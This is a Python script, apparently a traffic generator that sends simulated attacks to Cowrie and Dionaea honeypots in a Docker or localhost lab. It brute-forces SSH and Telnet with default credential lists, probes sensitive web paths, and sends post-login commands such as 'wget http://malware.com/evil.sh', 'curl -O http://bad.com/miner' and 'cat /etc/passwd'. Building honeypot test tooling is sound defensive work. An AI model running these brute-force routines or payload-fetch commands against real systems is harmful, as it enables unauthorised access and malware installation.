import time
import socket
import random
import logging
import argparse
import sys
import os

# 3rd party
try:
    import paramiko
    import requests
except ImportError as e:
    print(f"Missing dependency: {e}. Please install paramiko requests")
    # We'll continue but certain functions will fail or be skipped

# Note: telnetlib was deprecated in Python 3.11 and removed in Python 3.13.
# We now use pure socket implementation for Telnet (see attack_telnet function).

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] [TRAFFIC_GEN] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# --- Configuration ---

# Default Credentials
USERNAMES = ['root', 'admin', 'user', 'guest', 'support', 'oracle', 'pi', 'ubuntu', 'sysadmin']
PASSWORDS = ['123456', 'password', '12345678', 'admin', 'root', 'qwerty', 'guest', 'toor', 'changeme']

# Common Commands (for SSH/Telnet)
COMMANDS = [
    'whoami', 'id', 'ls -la', 'pwd', 'uname -a', 'ps aux',
    'cat /etc/passwd', 'netstat -an', 'wget http://malware.com/evil.sh',
    'curl -O http://bad.com/miner', 'echo "hacked" > /tmp/pwned'
]

# HTTP Paths (for Web Honeypots)
HTTP_PATHS = [
    '', 'index.html', 'login', 'admin', 'wp-login.php', 'phpmyadmin',
    '.env', 'config.php', 'backup.zip', 'api/v1/status'
]

# Service Definitions (Container Names and Ports)
# These match the service names in docker-compose.yml
TARGETS_DOCKER = {
    'cowrie': {
        'ssh': {'host': 'cowrie', 'port': 2222},
        'telnet': {'host': 'cowrie', 'port': 2223}
    },
    'dionaea': {
        'ftp': {'host': 'dionaea', 'port': 21},
        'http': {'host': 'dionaea', 'port': 80},
        'smb': {'host': 'dionaea', 'port': 445},
        'mssql': {'host': 'dionaea', 'port': 1433},
        'mysql': {'host': 'dionaea', 'port': 3306},
    }
}

# Localhost Fallback (for testing outside Docker network)
TARGETS_LOCAL = {
    'cowrie': {
        'ssh': {'host': 'localhost', 'port': 2222},
        'telnet': {'host': 'localhost', 'port': 2223}
    },
    'dionaea': {
        'ftp': {'host': 'localhost', 'port': 2121},
        'http': {'host': 'localhost', 'port': 8081},
        'smb': {'host': 'localhost', 'port': 8446},
        'mssql': {'host': 'localhost', 'port': 11433},
        'mysql': {'host': 'localhost', 'port': 33061},
    }
}


# --- Helper Functions ---

def get_random_creds():
    return random.choice(USERNAMES), random.choice(PASSWORDS)

def wait_for_service(host, port, timeout=5, retries=5):
    """Check if a service is reachable."""
    for i in range(retries):
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            time.sleep(2)
    return False

# --- Attack Functions ---

def attack_ssh(target):
    host = target['host']
    port = target['port']
    user, password = get_random_creds()
    
    logger.info(f"SSH Attack attempting {user}@{host}:{port}")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Simulate connection
        client.connect(host, port=port, username=user, password=password, timeout=5, banner_timeout=5)
        
        # If successful, run commands
        logger.info(f"SSH Login Successful! Executing commands on {host}...")
        
        # Open a session
        chan = client.invoke_shell()
        
        for _ in range(random.randint(1, 4)):
            cmd = random.choice(COMMANDS)
            chan.send(cmd + '\n')
            time.sleep(0.5) # Wait for "execution"
            
        client.close()
        
    except paramiko.AuthenticationException:
        logger.info(f"SSH Login Failed (Expected) for {user}@{host}")
    except Exception as e:
        logger.error(f"SSH Error: {e}")

def attack_telnet(target):
    """
    Pure socket-based Telnet client (Python 3.13+ compatible).
    Replaces deprecated telnetlib with manual socket handling.
    """
    host = target['host']
    port = target['port']
    user, password = get_random_creds()
    
    logger.info(f"Telnet Attack attempting {user}@{host}:{port}")
    
    try:
        # Create socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # Read initial banner/prompt (non-blocking receive)
        try:
            banner = s.recv(1024)
            logger.debug(f"Telnet banner: {banner[:50]}")
        except socket.timeout:
            pass  # No banner, proceed anyway
        
        # Send username
        s.send(user.encode('ascii') + b"\r\n")
        time.sleep(0.3)
        
        # Try to read password prompt
        try:
            prompt = s.recv(1024)
            logger.debug(f"Telnet prompt: {prompt[:50]}")
        except socket.timeout:
            pass
        
        # Send password
        s.send(password.encode('ascii') + b"\r\n")
        time.sleep(0.3)
        
        # Send some commands (even if auth failed, honeypots may respond)
        for _ in range(random.randint(1, 3)):
            cmd = random.choice(COMMANDS)
            s.send(cmd.encode('ascii') + b"\r\n")
            time.sleep(0.2)
            try:
                response = s.recv(1024)
                logger.debug(f"Response: {response[:50]}")
            except socket.timeout:
                pass  # Command may have failed, continue
        
        s.close()
        
    except ValueError as e:
        logger.info(f"Telnet Login Failed/Timeout for {user}@{host} (Expected)")
    except Exception as e:
        logger.error(f"Telnet Error: {e}")

def attack_http(target):
    host = target['host']
    port = target['port']
    path = random.choice(HTTP_PATHS)
    url = f"http://{host}:{port}/{path}"
    
    logger.info(f"HTTP probing {url}")
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; EvilScanner/1.0)'}
        response = requests.get(url, headers=headers, timeout=5)
        logger.info(f"HTTP {url} returned {response.status_code}")
        
        # Occasionally try a POST
        if random.random() < 0.3:
            requests.post(url, data={'user': 'admin', 'pass': '1234'}, timeout=5)
            
    except Exception as e:
        logger.error(f"HTTP Error: {e}")

def attack_tcp_generic(target, protocol_name):
    """
    For services like SMB, MSSQL, MySQL, FTP where we might not want to write full clients.
    Just connecting and sending garbage/auth strings helps trigger the honeypot "connection" logs.
    """
    host = target['host']
    port = target['port']
    
    logger.info(f"{protocol_name.upper()} probing {host}:{port}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # Depending on protocol, send something
        if protocol_name == 'ftp':
            s.recv(1024) # Banner
            s.send(b"USER anonymous\r\n")
            s.recv(1024) 
            s.send(b"PASS user@example.com\r\n")
        else:
            # Just send random bytes to trigger a "bad packet" or "data received" log
            s.send(os.urandom(32))
            
        s.close()
    except Exception as e:
        logger.error(f"{protocol_name.upper()} Error: {e}")
        
# --- Main Logic ---

def main():
    parser = argparse.ArgumentParser(description="Traffic Generator for Honeypots")
    parser.add_argument("--local", action="store_true", help="Run against localhost ports instead of docker names")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--count", type=int, default=1000, help="Max number of attacks")
    parser.add_argument("--sleep", type=float, default=1.0, help="Sleep between attacks")
    
    args = parser.parse_args()
    
    targets_config = TARGETS_LOCAL if args.local else TARGETS_DOCKER
    
    # Flatten targets list for random choice
    # Format: (service_name, protocol, target_dict)
    target_pool = []
    
    # Add Cowrie targets
    if 'cowrie' in targets_config:
        for proto, info in targets_config['cowrie'].items():
            target_pool.append(('cowrie', proto, info))
            
    # Add Dionaea targets
    if 'dionaea' in targets_config:
        for proto, info in targets_config['dionaea'].items():
            target_pool.append(('dionaea', proto, info))
            
    if not target_pool:
        logger.error("No targets configured!")
        sys.exit(1)
        
    logger.info(f"Starting traffic generation. Duration: {args.duration}s. Targets: {len(target_pool)}")
    
    start_time = time.time()
    attacks_performed = 0
    
    while time.time() - start_time < args.duration and attacks_performed < args.count:
        
        # Normalize weights? Or just random choice.
        # Let's pick a random target
        service, proto, info = random.choice(target_pool)
        
        # Check if service is up (cached check or quick check?)
        # We'll just do a quick connect check if it's the first few times, 
        # but for performance let's rely on the attack function handling errors.
        
        try:
            if proto == 'ssh':
                attack_ssh(info)
            elif proto == 'telnet':
                attack_telnet(info)
            elif proto == 'http':
                attack_http(info)
            else:
                attack_tcp_generic(info, proto)
                
            attacks_performed += 1
            
        except Exception as e:
            logger.error(f"Top-level loop error: {e}")
            
        time.sleep(args.sleep * random.uniform(0.5, 1.5))

    logger.info(f"Completed. Generated {attacks_performed} attack sequences.")

if __name__ == "__main__":
    main()
